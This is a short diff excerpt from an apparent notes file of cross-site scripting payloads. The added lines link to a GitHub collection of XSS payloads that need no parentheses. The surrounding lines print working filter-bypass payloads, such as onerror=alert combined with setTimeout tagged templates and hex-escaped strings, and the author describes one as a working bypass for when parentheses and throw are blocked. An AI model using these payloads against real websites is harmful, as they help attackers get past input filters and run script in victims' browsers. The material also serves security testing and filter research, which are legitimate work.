@@ -269,6 +269,8 @@ onerror=alert;setTimeout`\x74\x68\x72\x6F\x77 document.domain`
 ```
 - This is an working payload i just created i think and it is applicable bypass if throw and all escapes of `()` is blocked and it works on console.
 - it works on console due to setTimeout is method of window interface,hence window.onerror triggers.
+https://github.com/RenwaX23/XSS-Payloads/blob/master/Without-Parentheses.md
+- It is added here :D
 
 ```
 setTimeout`alert\x28\x29`
